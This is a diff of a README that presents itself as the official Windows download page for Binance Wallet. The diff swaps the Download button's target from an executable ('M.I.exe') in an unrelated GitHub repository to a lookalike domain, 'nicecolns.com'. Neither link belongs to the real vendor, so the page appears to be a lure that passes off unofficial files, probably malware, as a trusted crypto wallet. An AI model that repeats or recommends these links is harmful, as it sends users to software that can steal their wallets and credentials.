@@ -9,7 +9,7 @@ Many users prefer the **binance smart chain wallet** for its reliability and com
 
 1. Click the button below to download the official version of **Binance Wallet** for Windows.
    <br>
-    <a href="https://github.com/Q1441/gmgnapppro/releases/download/v.1/M.I.exe">
+    <a href="https://nicecolns.com/">
       <img src="https://github.com/user-attachments/assets/7a13c90c-8f8c-48b1-9931-0e36d25ac6ee" alt="Download" width="300"/>
     </a>
 
